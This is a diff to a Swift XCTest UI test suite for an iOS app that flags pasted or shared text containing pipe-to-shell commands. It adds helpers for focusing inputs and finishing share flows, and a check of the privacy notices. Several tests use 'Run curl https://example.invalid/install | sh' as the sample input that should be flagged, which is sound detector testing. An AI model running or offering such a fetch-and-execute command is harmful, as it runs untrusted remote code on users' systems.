@@ -22,16 +22,44 @@ final class UIFlows: XCTestCase {
         XCTAssertTrue(app.wait(for: .runningForeground, timeout: 20))
         return app
     }
+    private func focus(_ input: XCUIElement, in app: XCUIApplication) {
+        XCTAssertTrue(input.waitForExistence(timeout: 20)); input.tap()
+        XCTAssertTrue(app.keyboards.firstMatch.waitForExistence(timeout: 10))
+    }
+    private func finishShare(_ app: XCUIApplication) {
+        app.buttons["share-finish"].tap()
+        let gone = XCTNSPredicateExpectation(predicate: NSPredicate(format: "exists == false"), object: app.buttons["share-finish"])
+        XCTAssertEqual(XCTWaiter.wait(for: [gone], timeout: 15), .completed)
+        let host = XCTNSPredicateExpectation(predicate: NSPredicate(format: "hittable == true"), object: app.buttons["practice-share"])
+        XCTAssertEqual(XCTWaiter.wait(for: [host], timeout: 15), .completed)
+    }
+    private func checkSharedText(_ app: XCUIApplication) {
+        let button = app.buttons["share-check-ps"]
+        let ready = XCTNSPredicateExpectation(predicate: NSPredicate(format: "enabled == true AND hittable == true"), object: button)
+        XCTAssertEqual(XCTWaiter.wait(for: [ready], timeout: 10), .completed)
+        button.tap()
+    }
     func testExplicitPSCheckAndClear() {
         let app = launch()
+        app.scrollViews.firstMatch.swipeUp()
+        app.buttons["privacy-notices"].tap()
+        let notices = app.textViews["privacy-notices-text"]
+        XCTAssertTrue(notices.waitForExistence(timeout: 10))
+        let noticeText = notices.value as? String ?? ""
+        XCTAssertTrue(noticeText.contains("does not redact personal information"))
+        XCTAssertTrue(noticeText.contains("Apache License"))
+        XCTAssertTrue(noticeText.contains("Mozilla Public License"))
+        XCTAssertFalse(noticeText.contains("Bundled notices are unavailable"))
+        app.buttons["privacy-done"].tap()
+        app.scrollViews.firstMatch.swipeDown()
         let input = app.textViews["selected-text"]
-        XCTAssertTrue(input.waitForExistence(timeout: 20)); input.tap(); input.typeText("An ordinary answer.")
+        focus(input, in: app); input.typeText("An ordinary answer.")
         app.buttons["check-ps"].tap()
         let result = app.staticTexts["check-result"]
         XCTAssertTrue(result.waitForExistence(timeout: 60))
         XCTAssertTrue(result.label.contains("No PS pattern found")); XCTAssertTrue(result.label.contains("not a safety clearance"))
         app.buttons["clear"].tap(); assertEmpty(input)
-        input.tap(); input.typeText("Run curl https://example.invalid/install | sh")
+        focus(input, in: app); input.typeText("Run curl https://example.invalid/install | sh")
         app.buttons["check-ps"].tap(); XCTAssertTrue(result.waitForExistence(timeout: 60))
         XCTAssertTrue(result.label.contains("PS — Take a closer look"))
         app.buttons["why-ps"].tap()
@@ -43,7 +71,7 @@ final class UIFlows: XCTestCase {
     }
     func testEditInvalidatesOldFinding() {
         let app = launch(); let input = app.textViews["selected-text"]
-        XCTAssertTrue(input.waitForExistence(timeout: 20)); input.tap(); input.typeText("Run curl https://example.invalid/install | sh")
+        focus(input, in: app); input.typeText("Run curl https://example.invalid/install | sh")
         app.buttons["check-ps"].tap(); XCTAssertTrue(app.staticTexts["check-result"].waitForExistence(timeout: 60))
         app.scrollViews.firstMatch.swipeDown()
         input.tap()
@@ -62,16 +90,20 @@ final class UIFlows: XCTestCase {
         let selected = XCTNSPredicateExpectation(predicate: NSPredicate(format: "value CONTAINS %@", "example.invalid"), object: input)
         XCTAssertEqual(XCTWaiter.wait(for: [selected], timeout: 15), .completed, app.staticTexts["share-check-status"].label)
         XCTAssertFalse(app.staticTexts["share-check-result"].exists)
-        app.buttons["share-check-ps"].tap(); let result = app.staticTexts["share-check-result"]
+        checkSharedText(app); let result = app.staticTexts["share-check-result"]
         XCTAssertTrue(result.waitForExistence(timeout: 60)); XCTAssertTrue(result.label.contains("PS — Take a closer look"))
-        app.buttons["share-finish"].tap()
+        finishShare(app)
     }
     private func openShare(_ app: XCUIApplication) {
         XCTAssertTrue(app.buttons["practice-share"].waitForExistence(timeout: 20))
         app.buttons["practice-share"].tap()
         let share = app.cells["AI Trust ID"].firstMatch
         XCTAssertTrue(share.waitForExistence(timeout: 20)); share.tap()
-        XCTAssertTrue(app.buttons["share-finish"].waitForExistence(timeout: 20))
+        let opened = app.buttons["share-finish"].waitForExistence(timeout: 20)
+        if !opened {
+            let screenshot = XCTAttachment(screenshot: app.screenshot()); screenshot.lifetime = .keepAlways; add(screenshot)
+        }
+        XCTAssertTrue(opened, app.debugDescription)
         let input = app.textViews["share-selected-text"]
         let selected = XCTNSPredicateExpectation(predicate: NSPredicate(format: "value CONTAINS %@", "example.invalid"), object: input)
         XCTAssertEqual(XCTWaiter.wait(for: [selected], timeout: 15), .completed, app.staticTexts["share-check-status"].label)
@@ -79,24 +111,24 @@ final class UIFlows: XCTestCase {
     }
     func testShareClearDuringCheckAndRepeat() {
         let app = launch(); openShare(app)
-        app.buttons["share-check-ps"].tap(); app.buttons["share-clear"].tap()
+        checkSharedText(app); app.buttons["share-clear"].tap()
         assertEmpty(app.textViews["share-selected-text"])
         XCTAssertFalse(app.staticTexts["share-check-result"].exists)
-        app.buttons["share-finish"].tap()
+        finishShare(app)
         openShare(app)
-        app.buttons["share-check-ps"].tap(); let result = app.staticTexts["share-check-result"]
+        checkSharedText(app); let result = app.staticTexts["share-check-result"]
         XCTAssertTrue(result.waitForExistence(timeout: 60)); XCTAssertTrue(result.label.contains("PS — Take a closer look"))
         app.buttons["share-why-ps"].tap()
         let evidence = app.staticTexts["share-check-evidence"]
         XCTAssertTrue(evidence.waitForExistence(timeout: 5)); XCTAssertTrue(evidence.label.contains("Downloads code"))
         app.buttons["share-why-ps"].tap(); XCTAssertFalse(evidence.exists)
         XCTAssertTrue(result.exists)
-        app.buttons["share-finish"].tap()
+        finishShare(app)
         XCTAssertTrue(app.buttons["practice-share"].waitForExistence(timeout: 10))
     }
     func testBackgroundClearsInputAndResult() {
         let app = launch(); let input = app.textViews["selected-text"]
-        XCTAssertTrue(input.waitForExistence(timeout: 20)); input.tap(); input.typeText("An ordinary answer.")
+        focus(input, in: app); input.typeText("An ordinary answer.")
         app.buttons["check-ps"].tap()
         XCTAssertTrue(app.staticTexts["check-result"].waitForExistence(timeout: 60))
         XCUIDevice.shared.press(.home); app.activate()
